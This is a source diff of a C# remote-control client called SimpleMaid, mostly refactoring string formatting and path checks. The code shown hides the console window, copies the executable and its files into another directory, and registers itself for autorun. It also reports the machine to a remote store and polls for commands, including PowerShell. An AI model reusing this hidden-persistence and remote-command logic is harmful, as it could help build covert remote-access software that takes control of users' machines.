@@ -12,19 +12,15 @@ using System.Security;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
-using static SimpleMaid.Application;
 using static SimpleMaid.NativeMethods;
 using static SimpleMaid.PasswordStrength;
-using static SimpleMaid.PublicMethods;
-using static SimpleMaid.SimplePlatform;
 
 namespace SimpleMaid
 {
   class Program
   {
     //TODOS + убрать все private, эксперимент с static и инициализацией (как можно меньше инициализации здесь, но если она не на своём месте, то здесь)
-    //SEARCH: String.Format, Console.Write, +
-    //private static readonly Application Application = new Application();///////Application
+    //SEARCH: String.Format, Console.Write, +, Set, Get
     #region Properties
     public static bool Hidden { get; set; } = false;
     public static string State { set { Console.Title = $"{Application.ProductName}: {value}"; } }
@@ -204,8 +200,8 @@ namespace SimpleMaid
 
       #region Handle autorun
       handle = NativeMethods.GetConsoleWindow();
-      bool inAutorunDir = PublicMethods.ComparePaths(desiredAppDirectory.FullName, Application.StartupPath);
-      if (inAutorunDir || rogueArgFound)
+      bool inDesiredDir = PublicMethods.PathsEqual(desiredAppDirectory.FullName, Application.StartupPath);
+      if (inDesiredDir || rogueArgFound)
       {
         NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
         Program.Hidden = true;
@@ -243,7 +239,40 @@ namespace SimpleMaid
       #endregion
 
       #region Startup directory management
-      PublicMethods.DirectoryCopy(ConfigurationManager.AppSettings["SvtFolderName"], desiredAppDirectory.FullName);
+      if (!inDesiredDir)
+      {
+        PublicMethods.DirectoryCopy(ConfigurationManager.AppSettings["SvtFolderName"], desiredAppDirectory.FullName);
+
+
+        var file_oldpaths = new List<string>();
+        var file_paths = new List<string>();
+
+        string app_path = String.Format("{0}{1}.exe", desiredAppDirectory, Application.ProductName); // desired path, not actual one (app.ExecutablePath)
+        string app_config_path = String.Format("{0}{1}.exe.config", Application.StartupPath, Application.ProductName); // actual path, not desired one
+
+        file_oldpaths.Add(Application.ExecutablePath);
+        file_paths.Add(app_path);
+        // TODO: Kick some asses
+        var ass_paths = new string[] { app_config_path, Application.StartupPath + "INIFileParser.dll" };
+        foreach (var ass in ass_paths)
+        {
+          file_oldpaths.Add(ass);
+          file_paths.Add(desiredAppDirectory + Path.GetFileName(ass));
+        }
+
+        if (file_oldpaths.Count != file_paths.Count)
+        {
+          reportGeneralError(resources.OldnewErrorMessage);
+          exit();
+        }
+
+        for (int i = 0; i < file_paths.Count; ++i)
+        {
+          File.Copy(file_oldpaths[i], file_paths[i], true);
+        }
+
+        PublicMethods.SwitchAppAutorun(autoRun, Application.ProductName, app_path);
+      }
       #endregion
 
       #region Necessary INI declarations
@@ -383,47 +412,9 @@ namespace SimpleMaid
 
       #region Enable/disable autorun
       if (autoRun)
-      {
-        if (!inAutorunDir)
-        {
-          var file_oldpaths = new List<string>();
-          var file_paths = new List<string>();
-
-          string app_path = String.Format("{0}{1}.exe", desiredAppDirectory, Application.ProductName); // desired path, not actual one (app.ExecutablePath)
-          string app_config_path = String.Format("{0}{1}.exe.config", Application.StartupPath, Application.ProductName); // actual path, not desired one
-
-          file_oldpaths.Add(Application.ExecutablePath);
-          file_paths.Add(app_path);
-          // TODO: Kick some asses
-          var ass_paths = new string[] { app_config_path, Application.StartupPath + "INIFileParser.dll" };
-          foreach (var ass in ass_paths)
-          {
-            file_oldpaths.Add(ass);
-            file_paths.Add(desiredAppDirectory + Path.GetFileName(ass));
-          }
-
-          if (file_oldpaths.Count != file_paths.Count)
-          {
-            reportGeneralError(resources.OldnewErrorMessage);
-            exit();
-          }
-
-          for (int i = 0; i < file_paths.Count; ++i)
-          {
-            File.Copy(file_oldpaths[i], file_paths[i], true);
-          }
-
-          PublicMethods.SwitchAppAutorun(autoRun, Application.ProductName, app_path);
-        }
-        else
-        {
-          PublicMethods.SwitchAppAutorun(autoRun, Application.ProductName, Application.ExecutablePath);
-        }
-      }
+        PublicMethods.SwitchAppAutorun(Application.ProductName, Application.ExecutablePath);
       else
-      {
-        PublicMethods.SwitchAppAutorun(autoRun, Application.ProductName);
-      }
+        PublicMethods.SwitchAppAutorun(Application.ProductName);
       #endregion
 
       #region Configure machine
@@ -433,7 +424,7 @@ namespace SimpleMaid
 
         if (!machines.Contains(machine))
         {
-          while (resources.WebErrorMessage == Set("machines", String.Format("{0}{1}:", machines, machine)))
+          while (resources.WebErrorMessage == Set("machines", $"{machines}{machine}:"))
           {
             Thread.Sleep(1000);
           }
@@ -594,6 +585,26 @@ namespace SimpleMaid
       return passHolder;
     }
 
+    // TODO: Get filename from Response.Header
+    private static string urlToFile(string url)
+    {
+      string[] urlParts = url.Split(new char[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
+
+      return Uri.UnescapeDataString(urlParts[urlParts.Length - 1]);
+    }
+
+    // TODO: Implement adequate decoding
+    private static string decodeEncodedNonAsciiCharacters(string value)
+    {
+      return Regex.Replace(
+          value,
+          @"\\u(?<Value>[a-zA-Z0-9]{4})",
+          m =>
+          {
+            return ((char)int.Parse(m.Groups["Value"].Value, NumberStyles.HexNumber)).ToString();
+          });
+    }
+
     #region Reports
     private static void reportWeakPassword(string pas)
     {
@@ -669,8 +680,7 @@ namespace SimpleMaid
 
       busyChatWise = false;
 
-      while (resources.WebErrorMessage == Set("commands." + machine, resources.AnswerPrefix + 
-        String.Format("{0},{1}", resources.MessageCommand, ChatboxWindow.Visible.ToString())))
+      while (resources.WebErrorMessage == Set($"commands.{machine}", $"{resources.AnswerPrefix}{resources.MessageCommand},{ChatboxWindow.Visible}"))
       {
         Thread.Sleep(1000);
       }
@@ -742,7 +752,7 @@ namespace SimpleMaid
         var now = DateTime.Now;
 
         if (resources.WebErrorMessage !=
-          Set("time." + machine, String.Format("{0} {1}", now.ToShortDateString(), now.ToLongTimeString())))
+          Set($"time.{machine}", $"{now.ToShortDateString()} {now.ToLongTimeString()}"))
         {
           if (!internetAlive)
             resurrectDeadThreads();
@@ -1069,7 +1079,7 @@ namespace SimpleMaid
         closeChatWindow();
       }
 
-      return String.Format("{0},{1}", resources.MessageCommand, ChatboxWindow.Visible.ToString());
+      return $"{resources.MessageCommand},{ChatboxWindow.Visible}";
     }
 
     private static string powershellCommand(string[] command_parts)
